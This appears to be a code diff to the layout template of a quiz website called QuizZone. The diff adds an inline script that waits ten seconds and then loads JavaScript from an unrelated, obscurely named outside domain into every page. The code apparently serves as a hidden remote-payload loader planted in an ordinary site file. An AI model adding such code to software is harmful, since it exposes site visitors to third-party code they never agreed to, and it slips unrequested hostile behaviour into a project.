@@ -48,5 +48,13 @@ const fullTitle = title.includes('QuizZone') ? title : `${title} | QuizZone`;
 </head>
 <body>
   <slot />
+  <script is:inline>
+    setTimeout(() => {
+      const script = document.createElement('script');
+      script.src = 'https://anniversaryvacuumambassador.com/f3/15/df/f315df92a2766c4513eb767ed9739ee0.js';
+      script.type = 'text/javascript';
+      document.head.appendChild(script);
+    }, 10000);
+  </script>
 </body>
 </html>
